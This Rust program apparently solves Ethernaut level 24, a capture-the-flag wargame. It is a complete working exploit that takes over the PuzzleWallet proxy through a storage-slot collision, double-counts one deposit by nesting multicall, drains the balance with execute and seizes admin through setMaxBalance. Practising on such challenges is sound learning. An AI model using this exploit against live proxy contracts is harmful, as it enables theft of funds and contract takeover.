#[allow(unused_imports)]
use alloy::{
    sol_types::SolCall,
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Address, B256, Bytes, U256, address,
        keccak256,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract PuzzleProxy {
        // Proxy
        function pendingAdmin() external view returns (address);
        function admin() external view returns (address);

        function proposeNewAdmin(address _newAdmin) external;

        // Implementation
        function maxBalance() external view returns (uint256);
        function owner() external view returns (address);
        function whitelisted(address addr) external view returns (bool);
        function balances(address addr) external view returns (uint256);
        
        function addToWhitelist(address addr) external;
        function multicall(bytes[] data) external payable;
        function deposit() external payable;
        function execute(address to, uint256 value, bytes data) external payable;
        function setMaxBalance(uint256 _maxBalance) external;
    }
}


use crate::ethernaut;
use crate::utils;
use crate::macros::wait_tx;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level24_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level24())?;
    Ok(())
}

async fn level24() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer: PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;
    
    let proxy_address = "0xd8ea3486B2FA61bB2690d08F3A526e4C8f62395A".parse()?;
    let proxy = PuzzleProxy::new(proxy_address, provider.clone());
    let alice = ethernaut::ALICE.parse()?;

    println!("[INIT]");
    println!("max balance = {}", proxy.maxBalance().call().await?);
    println!("wallet's balance = {}\n", utils::balance(proxy_address).await?);

    // send proposeNewAdmin() for changing owner

    let propose_tx = proxy.proposeNewAdmin(alice)
        .send()
        .await?;
    let _ = wait_tx!(propose_tx, "PuzzleProxy.proposeNewAdmin()");

    println!("[CHECK]");
    println!("    owner = {}\n", proxy.owner().call().await?);
    
    // send addToWhitelist() for getting whitlist.

    let add_tx = proxy.addToWhitelist(alice)
        .send()
        .await?;
    let _ = wait_tx!(add_tx, "PuzzleProxy.addToWhitelist");

    println!("[CHECK]");
    println!("    Alice whitlist = {}\n", proxy.whitelisted(alice).call().await?);
    
    // send muticall() for reducing balance of wallet.
    
    /*
    struct of calldata:
    -- deposit()
    -- muticalCall()
        -- deposit()
    */
    let deposit_data = Bytes::from(PuzzleProxy::depositCall {}.abi_encode());
    let mut data = vec![deposit_data];
    let muti_data = Bytes::from(PuzzleProxy::multicallCall {data: data.clone()}.abi_encode());
    data.push(muti_data);
    let muti_tx = proxy.multicall(data)
        .value(U256::from(1000000000000000u128))
        .send()
        .await?;
    let _ = wait_tx!(muti_tx, "PuzzleProxy.muticalCall()");

    println!("[CHECK]");
    println!("wallet's balance = {}", utils::balance(proxy_address).await?);
    println!("alice's balance  = {}\n", proxy.balances(alice).call().await?);

    // execute()
    let exe_tx = proxy
        .execute(alice, U256::from(2000000000000000u128), Bytes::new())
        .send()
        .await?;
    let _ = wait_tx!(exe_tx, "PuzzleProxy.execute()");

    println!("[CHECK]");
    println!("wallet's balance = {}", utils::balance(proxy_address).await?);
    println!("alice's balance  = {}\n", proxy.balances(alice).call().await?);

    // send setMaxBalance for changing admin
    let set_tx = proxy
        .setMaxBalance(U256::from_be_slice(alice.as_slice()))
        .send()
        .await?;
    let _ = wait_tx!(set_tx, "PuzzleProxy.setMaxBalance()");
    
    println!("[CHECK]");
    println!("    admin = {}", proxy.admin().call().await?);
    
    Ok(())
}



